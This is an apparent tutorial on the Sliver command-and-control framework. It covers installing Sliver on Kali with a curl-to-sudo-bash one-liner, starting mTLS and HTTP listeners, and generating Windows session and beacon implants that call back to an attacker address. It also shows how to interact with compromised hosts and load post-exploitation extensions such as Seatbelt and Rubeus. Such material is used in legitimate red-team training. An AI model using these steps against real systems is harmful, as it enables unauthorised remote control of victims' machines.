# Sliver: Download and CLI

#### Phase 1: Installation & Launch on Kali Linux

If Sliver isn't already installed on your Kali machine, you can install it via the official one-liner script:

```
curl https://sliver.sh/install | sudo bash
```

Once installed, start and interact with the server:

1.  **Start the service:**

    ```
    sudo systemctl start sliver
    ```
2.  **Launch the CLI console:**

    ```
    sliver
    ```

    _(You will be greeted by the Sliver prompt: `[server] sliver >`)_

#### Phase 2: Core CLI Flow & Important Features

To get a payload running and catch a connection, follow this core workflow:

**1. Start a Listener**

Before generating any payload, your server needs to listen for incoming traffic. The primary protocols are **mTLS** (Mutual TLS—highly secure/stealthy), **HTTP/HTTPS**, and **DNS**.

*   To start an mTLS listener:

    ```
    mtls
    ```
*   To start an HTTP listener:

    ```
    http
    ```
*   To view running background jobs/listeners:

    ```
    jobs
    ```

**2. Generate an Implant (Payload)**

Sliver dynamically compiles unique binaries embedded with custom X.509 certificates. You can create either **Sessions** (interactive) or **Beacons** (asynchronous check-ins).

*   **Generate a Session Implant (mTLS):**

    ```
    generate --mtls <KALI_IP> --os windows --arch amd64 --save /tmp/session.exe
    ```
*   **Generate a Beacon Implant (HTTP with Jitter):**

    ```
    generate beacon --http <KALI_IP> --os windows --arch amd64 --seconds 60 --jitter 10 --save /tmp/beacon.exe
    ```

    _(This creates an executable targeting Windows 64-bit that calls back every 60 seconds with a 10-second random jitter)._

**3. Interacting with Connections**

Once the target executes your payload, it will check into your server.

*   **View active Beacons:**

    ```
    beacons
    ```
*   **View active interactive Sessions:**

    ```
    sessions
    ```
*   **Interact with a specific beacon/session:**

    ```
    use <Beacon_ID_or_Name>
    ```

    _(Once inside a beacon or session context, typing `help` will list all available post-exploitation commands for that target)._

#### Phase 3: Advanced Features to Explore Next

* **Armory (`armory`):** Sliver’s built-in package manager. It allows you to download post-exploitation extensions, tools, and Beacon Object Files (BOFs) like Seatbelt or Rubeus directly into your framework with a simple command (e.g., `armory install seatbelt`).
* **Profiles (`profiles`):** If you find yourself typing long `generate` commands repeatedly, you can save configuration templates using `profiles new beacon ...` and instantly spin up new payloads using `profiles generate <profile_name>`.
* **Multiplayer Mode (`operator`):** Sliver natively supports team collaboration. You can generate configuration files for other operators so multiple people can connect to the same central C2 team server simultaneously.

When beacon is execute u can view it in `beacons` also to use that beacon use `<id>` and then use help command to see what what u can do:&#x20;

## Install an extension

```
armpory install <extension-name>
```

`load` that extension in sliver memory:

```
extensions load <extension-name>
```

`use` that extension:

```
<extension-name> help
```
